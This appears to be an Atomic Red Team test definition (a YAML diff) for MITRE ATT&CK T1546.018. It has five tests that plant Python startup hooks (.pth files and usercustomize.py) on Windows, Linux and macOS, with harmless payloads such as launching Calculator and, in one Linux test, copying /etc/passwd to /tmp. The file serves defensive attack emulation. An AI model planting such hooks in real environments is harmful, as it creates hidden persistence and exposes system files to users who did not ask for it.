@@ -1,0 +1,205 @@
+attack_technique: T1546.018
+display_name: 'Event Triggered Execution: Python Startup Hooks'
+atomic_tests:
+  - name: Python Startup Hook - atomic_hook.pth (Windows)
+    auto_generated_guid: 57289962-21dc-4501-b756-80cd30608d9f
+    description: |
+      Executes code by placing a .pth file in the site-packages directory. 
+      Supports python.exe and python3.exe via input arguments.
+    supported_platforms:
+      - windows
+    input_arguments:
+      python_exe:
+        description: The python binary name to test.
+        type: String
+        default: python.exe
+    dependency_executor_name: powershell
+    dependencies:
+      - description: |
+          Python must be installed and the specified binary (#{python_exe}) must be in the PATH.
+        prereq_command: |
+          if (Get-Command @("#{python_exe}", 'python3.exe') -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          Write-Host "[!] Python3 not found. Please install Python3 (e.g., winget install python3 or winget install python or https://www.python.org/downloads/windows/) or ensure it is in your PATH."
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        $TempDir = Join-Path $env:TEMP "atomic_pth_win"
+        New-Item -ItemType Directory -Path $TempDir -Force
+        & "#{python_exe}" -m venv "$TempDir\env"
+        $SitePackages = & "$TempDir\env\Scripts\python.exe" -c "import site; print(site.getsitepackages()[1])"
+        "import os, subprocess; os.environ.get('CALC_SPAWNED') or (os.environ.update({'CALC_SPAWNED':'1'}) or subprocess.Popen(['calc.exe']))" | Out-File -Encoding ASCII "$SitePackages\atomic_hook.pth"
+        Get-ChildItem -Path "$SitePackages" | Where-Object { $_.Name -like "*.pth" }
+        & "$TempDir\env\Scripts\python.exe" -c "print('Triggering Hook via atomic_hook...')"
+      cleanup_command: |
+        if (-not (Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Where-Object Name -like 'atomic_pth_win')) { Write-Host "[!] Artifact missing: $env:Temp\atomic_pth_win Folder - [-] Please Run : Invoke-AtomicTest T1546.018"; exit 1 };
+        Remove-Item -Path "$env:TEMP\atomic_pth_win" -Recurse -Force
+        Write-Host "[+] Successfully Removed atomic_pth_win folder and atomic_hook.pth from Temp Directory"
+        Get-Process -Name "Calc*" -ErrorAction SilentlyContinue | Stop-Process -Force
+        Get-Process -Name "calc*" -ErrorAction SilentlyContinue | Stop-Process -Force
+        Write-Host "[+] Successfully Terminated Calculator"
+
+  - name: Python Startup Hook - usercustomize.py (Windows)
+    auto_generated_guid: 05cc7a2c-ce32-46f2-a358-f27f76718c39
+    description: |
+      Executes code via usercustomize.py. This is a per-user persistence mechanism 
+      that does not require Administrative privileges.
+    supported_platforms:
+      - windows
+    input_arguments:
+      python_exe:
+        description: The python binary name to test
+        type: String
+        default: python.exe
+    dependency_executor_name: powershell
+    dependencies:
+      - description: |
+          Python must be installed and the specified binary (#{python_exe}) must be in the PATH.
+        prereq_command: |
+          if (Get-Command @("#{python_exe}", 'python3.exe') -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          Write-Host "[!] Python3 not found. Please install Python3 (e.g., winget install python3 or winget install python or https://www.python.org/downloads/windows/) or ensure it is in your PATH."
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        $UserDir = & "#{python_exe}" -c "import site; print(site.getusersitepackages())"
+        if (!(Test-Path $UserDir)) { New-Item -ItemType Directory -Path $UserDir -Force }
+        "import os; os.system('calc.exe')" | Out-File -FilePath "$UserDir\usercustomize.py" -Encoding ASCII
+        Get-ChildItem -Path "$UserDir"
+        & "#{python_exe}" -c "print('Triggering Hook via usercustomize...')"
+      cleanup_command: |
+        $PyBin = if (Get-Command "#{python_exe}" -ErrorAction SilentlyContinue) { "#{python_exe}" } elseif (Get-Command "python3.exe" -ErrorAction SilentlyContinue) { "python3.exe" } else { "python.exe" }; 
+        $UserDir = & $PyBin -S -c "import site; print(site.getusersitepackages())"
+        if (-not (Get-ChildItem -Path $UserDir -Recurse -ErrorAction SilentlyContinue | Where-Object Name -like 'usercustomize*')) { Write-Host "[!] Artifact missing: $UserDir\usercustomize.py - [-] Please Run : Invoke-AtomicTest T1546.018"; exit 1 };
+        Get-ChildItem -Path "$UserDir" -Recurse -Force |
+        Where-Object { $_.Name -like "usercustomize*" } |
+        Remove-Item -Force 
+        Write-Host "[+] Successfully Removed usercustomize.py under $UserDir"
+        Get-Process -Name "Calc*", "calc*" -ErrorAction SilentlyContinue | Stop-Process -Force
+        Write-Host "[+] Successfully Terminated Calculator"
+
+  - name: Python Startup Hook - atomic_hook.pth (Linux)
+    auto_generated_guid: a58c066d-f2f0-42a2-ab70-30af73f89e66
+    description: |
+      Executes code by creating atomic_hook.pth in the site-packages directory. 
+      This script runs automatically for every user on the system when Python starts.
+    supported_platforms:
+      - linux
+    input_arguments:
+      python_exe:
+        description: The python binary name to test
+        type: String
+        default: python3
+    dependency_executor_name: sh
+    dependencies:
+      - description: |
+          Python must be installed and the specified binary (#{python_exe}) must be in the PATH.
+        prereq_command: |
+          PYTHON_CMD=$(command -v #{python_exe} || command -v python)
+          if [ -z "$PYTHON_CMD" ]; then exit 1; fi
+          $PYTHON_CMD -m venv --help >/dev/null 2>&1
+        get_prereq_command: |
+          echo "Python not found. Please install Python using your package manager (e.g., Debian Based 'sudo apt-get update && sudo apt-get install -y python3 python3-venv', RedHat / CentOS Based 'sudo yum install -y python3 python3-venv || sudo dnf install -y python3 python3-venv')."
+    executor:
+      name: sh
+      elevation_required: false
+      command: |
+        TEMPDIR="/tmp/atomic_sitecust_posix"
+        mkdir -p "$TEMPDIR"
+        "#{python_exe}" -m venv "$TEMPDIR/env"
+        SITE_PACKAGES=$("$TEMPDIR/env/bin/#{python_exe}" -c "import site; print(site.getsitepackages()[0])")
+        echo "import os; os.system('cat /etc/passwd 1> /tmp/atomic_hook_poc.txt')" > "$SITE_PACKAGES/atomic_hook.pth"
+        ls -la "$SITE_PACKAGES/atomic_hook.pth"
+        "$TEMPDIR/env/bin/python" -c "print('Triggering Hook via atomic_hook...')"
+        if [ -f /tmp/atomic_hook_poc.txt ]; then echo "[+] Success: atomic_hook_poc.txt created under /tmp \n" $(ls -la /tmp/ | grep -w atomic_hook_poc.txt); else echo "Failed: /tmp/atomic_hook_poc.txt not found"; fi
+      cleanup_command: |
+        if [ ! -f /tmp/atomic_hook_poc.txt ] || [ ! -d /tmp/atomic_sitecust_posix ]; then echo "[!] Missing artifact or folder: /tmp/atomic_hook_poc.txt or /tmp/atomic_sitecust_posix — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
+        rm -rf /tmp/atomic_sitecust_posix
+        echo "[+] Successful Removed atomic_hook.pth"
+        rm -rf /tmp/atomic_hook_poc.txt
+        echo "[+] Successful Removed atomic_hook_poc.txt under /tmp"
+
+  - name: Python Startup Hook - atomic_hook.pth (macOS)
+    auto_generated_guid: 28ca4f81-fa96-47ff-8555-dde98017e89b
+    description: |
+      Creates a Python startup hook using a .pth file inside a virtual environment on macOS.
+    supported_platforms:
+      - macos
+    input_arguments:
+      exe_name:
+        description: App to launch
+        type: string
+        default: Calculator
+      python_exe:
+        description: The python binary name to test
+        type: string
+        default: python3
+    dependency_executor_name: sh
+    dependencies:
+      - description: Python must be installed and the specified binary (#{python_exe}) must be in the PATH.
+        prereq_command: |
+          PYTHON_CMD=$(command -v python || command -v #{python_exe})
+          if [ -z "$PYTHON_CMD" ]; then exit 1; fi
+          $PYTHON_CMD -m venv --help >/dev/null 2>&1
+        get_prereq_command: |
+          echo "Python3 not found. Please install it using Homebrew ('brew install python' or 'brew install python3 or brew install python@3.X') or the macOS developer tools ('xcode-select --install')."
+    executor:
+      name: sh
+      elevation_required: false
+      command: |
+        PYTHON_EXE=$(command -v #{python_exe} || command -v python)
+        TEMPDIR=$(mktemp -d /tmp/atomic_python_hook_XX)
+        echo "$TEMPDIR" > /tmp/atomic_python_hook_path.txt
+        $PYTHON_EXE -m venv "$TEMPDIR/env"
+        SITE_PACKAGES=$("$TEMPDIR/env/bin/#{python_exe}" -c "import site; print(site.getsitepackages()[0])")
+        echo "import subprocess; subprocess.Popen(['open', '-a', '#{exe_name}'])" > "$SITE_PACKAGES/atomic_hook.pth"
+        "$TEMPDIR/env/bin/python" -c "print('Triggering Hook via atomic_hook...')"
+      cleanup_command: |
+        if [ ! -f /tmp/atomic_python_hook_path.txt ] || [ ! -d $(cat /tmp/atomic_python_hook_path.txt) ]; then echo "[!] Artifact missing: /tmp/atomic_python_hook_path.txt — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
+        pkill "#{exe_name}" || true
+        [ -f /tmp/atomic_python_hook_path.txt ] && rm -rf $(cat /tmp/atomic_python_hook_path.txt) && rm -f /tmp/atomic_python_hook_path.txt
+        echo "[+] Successful Removed atomic_hook.pth and terminated #{exe_name}"
+        
+  - name: Python Startup Hook - usercustomize.py (Linux / MacOS)
+    auto_generated_guid: 6e78084a-a433-4702-a838-cc7b765d87e8
+    description: |
+      Executes code via usercustomize.py. This is a per-user persistence mechanism 
+      that does not require root privileges.
+    supported_platforms:
+      - linux
+      - macos
+    input_arguments:
+      python_exe:
+        description: The python binary name to test
+        type: String
+        default: python3
+    dependency_executor_name: sh
+    dependencies:
+      - description: |
+          Python must be installed and the specified binary (#{python_exe}) must be in the PATH.
+        prereq_command: |
+          PYTHON_CMD=$(command -v #{python_exe} || command -v python)
+          if [ -z "$PYTHON_CMD" ]; then exit 1; fi
+          $PYTHON_CMD -m venv --help >/dev/null 2>&1
+        get_prereq_command: |
+          echo "Python not found. Please install Python using your package manager (e.g., Debian Based 'sudo apt-get update && sudo apt-get install -y python3 python3-venv', RedHat / CentOS Based 'sudo yum install -y python3 python3-venv || sudo dnf install -y python3 python3-venv', MacOS brew install python3 or brew install python@3.x or the macOS developer tools ('xcode-select --install'))."
+    executor:
+      name: sh
+      elevation_required: false
+      command: |
+        PYTHON_EXE=$(command -v #{python_exe} || command -v python)
+        USER_PACKAGES=$($PYTHON_EXE -c "import site; print(site.getusersitepackages())")
+        mkdir -p "$USER_PACKAGES"
+        echo "import os; os.system('date > /tmp/poc.txt')" > "$USER_PACKAGES/usercustomize.py"
+        if [ -f "$USER_PACKAGES/usercustomize.py" ]; then echo "Success: usercustomize.py created under $USER_PACKAGES\n" $(ls -la "$USER_PACKAGES" | grep usercustomize*); else echo "Failed: usercustomize.py not found under $USER_PACKAGES"; fi
+        $PYTHON_EXE -c "print('Triggering Hook via usercustomize.py...')"
+        if [ -f /tmp/poc.txt ]; then echo "Success: poc.txt created under /tmp\n" $(ls -la /tmp/ | grep -w poc.txt); else echo "Failed: /tmp/poc.txt not found"; fi
+      cleanup_command: |
+        PYTHON_CMD=$(command -v #{python_exe} || command -v python)
+        USER_PACKAGES=$($PYTHON_CMD -S -c "import site; print(site.getusersitepackages())")
+        if [ ! -f /tmp/poc.txt ] || [ ! -f $USER_PACKAGES/usercustomize.py ]; then echo "[!] Artifact missing: /tmp/poc.txt and $USER_PACKAGES/usercustomize.py — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
+        if [ -e "$USER_PACKAGES"/usercustomize* ]; then echo "[+] Successful remove $USER_PACKAGES/usercustomize.py\n" $(rm -rf "$USER_PACKAGES"/usercustomize*); else echo "usercustomize.py not found under $USER_PACKAGES"; fi
+        rm -rf /tmp/poc.txt
+        echo "[+] Successful remove poc.txt under /tmp"
